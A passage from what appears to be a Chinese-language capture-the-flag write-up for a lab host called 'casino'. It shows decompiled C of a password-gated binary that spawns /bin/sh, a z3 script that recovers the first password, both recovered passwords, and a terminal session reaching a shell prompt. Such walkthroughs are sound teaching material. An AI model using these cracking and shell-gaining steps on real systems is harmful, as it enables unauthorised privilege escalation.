  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-F4h]</span>
  <span class="token keyword">char</span> s1<span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-F0h] BYREF</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>argva<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+80h] [rbp-80h] BYREF</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-70h] BYREF</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+FCh] [rbp-4h]</span>

  <span class="token function">HIBYTE</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">HIBYTE</span><span class="token punctuation">(</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Passwd: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> s<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
    s<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">checkPasswd</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v9 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/opt/root.pass"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v3 <span class="token operator">=</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setuid</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Second Passwd: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> s1<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
    s1<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s1<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> <span class="token string">"ultrasecretpassword"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    argva<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"sh"</span><span class="token punctuation">;</span>
    argva<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
    <span class="token function">execvp</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> argva<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"bye."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>先是用checkPasswd检测输入的第一个密码，如果满足打开&#x2F;opt&#x2F;root.pass，setuid为0，然后输入第二个密码，如果与<code>ultrasecretpassword</code>相等，执行<code>/bin/sh sh</code>拿到root的shell，否则bye结束<br>那先看<code>checkPasswd</code></p>
<pre class="language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">checkPasswd</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">26</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">*</span>a1 <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">10</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">208</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token punctuation">)</span>
          <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10100</span> <span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">219</span> <span class="token punctuation">)</span>
              <span class="token punctuation">&#123;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">11</span> <span class="token punctuation">)</span>
                <span class="token punctuation">&#123;</span>
                  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">10</span> <span class="token punctuation">)</span>
                  <span class="token punctuation">&#123;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">11845</span> <span class="token punctuation">)</span>
                    <span class="token punctuation">&#123;</span>
                      <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">7</span> <span class="token punctuation">)</span>
                      <span class="token punctuation">&#123;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
                        <span class="token punctuation">&#123;</span>
                          <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">9797</span> <span class="token punctuation">)</span>
                          <span class="token punctuation">&#123;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
                            <span class="token punctuation">&#123;</span>
                              <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">11252</span> <span class="token punctuation">)</span>
                              <span class="token punctuation">&#123;</span>
                                <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token punctuation">)</span>
                                <span class="token punctuation">&#123;</span>
                                  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
                                  <span class="token punctuation">&#123;</span>
                                    <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">5</span> <span class="token punctuation">)</span>
                                    <span class="token punctuation">&#123;</span>
                                      <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10815</span> <span class="token punctuation">)</span>
                                      <span class="token punctuation">&#123;</span>
                                        <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token punctuation">)</span>
                                        <span class="token punctuation">&#123;</span>
                                          <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token operator">*</span>a1 <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">8</span> <span class="token punctuation">)</span>
                                          <span class="token punctuation">&#123;</span>
                                            <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
                                            <span class="token punctuation">&#123;</span>
                                              <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">220</span> <span class="token punctuation">)</span>
                                              <span class="token punctuation">&#123;</span>
                                                <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span> <span class="token punctuation">)</span>
                                                <span class="token punctuation">&#123;</span>
                                                  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
                                                  <span class="token punctuation">&#123;</span>
                                                    <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">*</span> a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">12654</span> <span class="token punctuation">)</span>
                                                    <span class="token punctuation">&#123;</span>
                                                      <span class="token keyword">if</span> <span class="token punctuation">(</span> a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">15</span> <span class="token punctuation">)</span>
                                                      <span class="token punctuation">&#123;</span>
                                                        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Correct pass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                                        <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>
                                                      <span class="token punctuation">&#125;</span>
                                                      <span class="token keyword">else</span>
                                                      <span class="token punctuation">&#123;</span>
                                                        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                                      <span class="token punctuation">&#125;</span>
                                                    <span class="token punctuation">&#125;</span>
                                                    <span class="token keyword">else</span>
                                                    <span class="token punctuation">&#123;</span>
                                                      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                                    <span class="token punctuation">&#125;</span>
                                                  <span class="token punctuation">&#125;</span>
                                                  <span class="token keyword">else</span>
                                                  <span class="token punctuation">&#123;</span>
                                                    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                                  <span class="token punctuation">&#125;</span>
                                                <span class="token punctuation">&#125;</span>
                                                <span class="token keyword">else</span>
                                                <span class="token punctuation">&#123;</span>
                                                  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                                <span class="token punctuation">&#125;</span>
                                              <span class="token punctuation">&#125;</span>
                                              <span class="token keyword">else</span>
                                              <span class="token punctuation">&#123;</span>
                                                <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                              <span class="token punctuation">&#125;</span>
                                            <span class="token punctuation">&#125;</span>
                                            <span class="token keyword">else</span>
                                            <span class="token punctuation">&#123;</span>
                                              <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                            <span class="token punctuation">&#125;</span>
                                          <span class="token punctuation">&#125;</span>
                                          <span class="token keyword">else</span>
                                          <span class="token punctuation">&#123;</span>
                                            <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                          <span class="token punctuation">&#125;</span>
                                        <span class="token punctuation">&#125;</span>
                                        <span class="token keyword">else</span>
                                        <span class="token punctuation">&#123;</span>
                                          <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                        <span class="token punctuation">&#125;</span>
                                      <span class="token punctuation">&#125;</span>
                                      <span class="token keyword">else</span>
                                      <span class="token punctuation">&#123;</span>
                                        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                      <span class="token punctuation">&#125;</span>
                                    <span class="token punctuation">&#125;</span>
                                    <span class="token keyword">else</span>
                                    <span class="token punctuation">&#123;</span>
                                      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                    <span class="token punctuation">&#125;</span>
                                  <span class="token punctuation">&#125;</span>
                                  <span class="token keyword">else</span>
                                  <span class="token punctuation">&#123;</span>
                                    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                  <span class="token punctuation">&#125;</span>
                                <span class="token punctuation">&#125;</span>
                                <span class="token keyword">else</span>
                                <span class="token punctuation">&#123;</span>
                                  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                                <span class="token punctuation">&#125;</span>
                              <span class="token punctuation">&#125;</span>
                              <span class="token keyword">else</span>
                              <span class="token punctuation">&#123;</span>
                                <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                              <span class="token punctuation">&#125;</span>
                            <span class="token punctuation">&#125;</span>
                            <span class="token keyword">else</span>
                            <span class="token punctuation">&#123;</span>
                              <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                            <span class="token punctuation">&#125;</span>
                          <span class="token punctuation">&#125;</span>
                          <span class="token keyword">else</span>
                          <span class="token punctuation">&#123;</span>
                            <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                          <span class="token punctuation">&#125;</span>
                        <span class="token punctuation">&#125;</span>
                        <span class="token keyword">else</span>
                        <span class="token punctuation">&#123;</span>
                          <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                        <span class="token punctuation">&#125;</span>
                      <span class="token punctuation">&#125;</span>
                      <span class="token keyword">else</span>
                      <span class="token punctuation">&#123;</span>
                        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                      <span class="token punctuation">&#125;</span>
                    <span class="token punctuation">&#125;</span>
                    <span class="token keyword">else</span>
                    <span class="token punctuation">&#123;</span>
                      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                    <span class="token punctuation">&#125;</span>
                  <span class="token punctuation">&#125;</span>
                  <span class="token keyword">else</span>
                  <span class="token punctuation">&#123;</span>
                    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                  <span class="token punctuation">&#125;</span>
                <span class="token punctuation">&#125;</span>
                <span class="token keyword">else</span>
                <span class="token punctuation">&#123;</span>
                  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
              <span class="token punctuation">&#125;</span>
              <span class="token keyword">else</span>
              <span class="token punctuation">&#123;</span>
                <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">&#123;</span>
              <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
          <span class="token punctuation">&#125;</span>
          <span class="token keyword">else</span>
          <span class="token punctuation">&#123;</span>
            <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
          <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Incorrect pass"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>果然考的是re，用z3解</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">from z3 <span class="token function">import</span> *

def check_passwd<span class="token punctuation">(</span><span class="token punctuation">)</span>:
    a1 <span class="token operator">=</span> <span class="token punctuation">[</span>Int<span class="token punctuation">(</span><span class="token string">'a1[%d]'</span> % i<span class="token punctuation">)</span> <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    constraints <span class="token operator">=</span> <span class="token punctuation">[</span>
     
        len<span class="token punctuation">(</span>a1<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">26</span>,
        a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> -10,
        a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> + a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">208</span>,
        a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10</span>,
        a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> -2,
        a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10100</span>,
        a1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> + a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">219</span>,
        a1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">==</span> -11,
        a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">==</span> -10,
        a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">11845</span>,
        a1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">==</span> -7,
        a1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">1</span>,
        a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">9797</span>,
        a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">3</span>,
        a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">11252</span>,
        a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">==</span> -2,
        a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span>,
        a1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">==</span> -5,
        a1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10815</span>,
        a1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">==</span> -2,
        a1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> -8,
        a1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">4</span>,
        a1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> + a1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">220</span>,
        a1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">15</span>,
        a1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">==</span> a1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span>,
        a1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> * a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">12654</span>,
        a1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> - a1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token parameter variable">-15</span>
    <span class="token punctuation">]</span>
    solver <span class="token operator">=</span> Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>
    solver.add<span class="token punctuation">(</span>constraints<span class="token punctuation">)</span>
    <span class="token keyword">if</span> solver.check<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> sat:
     
        model <span class="token operator">=</span> solver.model<span class="token punctuation">(</span><span class="token punctuation">)</span>
        password <span class="token operator">=</span> <span class="token string">""</span>.join<span class="token punctuation">(</span><span class="token punctuation">[</span>chr<span class="token punctuation">(</span>model<span class="token punctuation">[</span>a1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span>.as_long<span class="token punctuation">(</span><span class="token punctuation">))</span> <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        print<span class="token punctuation">(</span><span class="token string">"Correct pass: "</span>, password<span class="token punctuation">)</span>
    else:
        print<span class="token punctuation">(</span><span class="token string">"Incorrect pass"</span><span class="token punctuation">)</span>

check_passwd<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<p>解出来<code>ihopethisisastrongpassword</code>,这就拿到第一个密码了，第二个密码又是已知</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">shimmer@casino:~$ ./pass
Passwd: ihopethisisastrongpassword                                                                                                                                                                                                                                                                                          
Correct pass                                                                                                                                                                                                                                                                                                                
Second Passwd: ultrasecretpassword                                                                                                                                                                                                                                                                                          
$ <span class="token function">id</span>                                                                                                                                                                                                                                                                                                                        
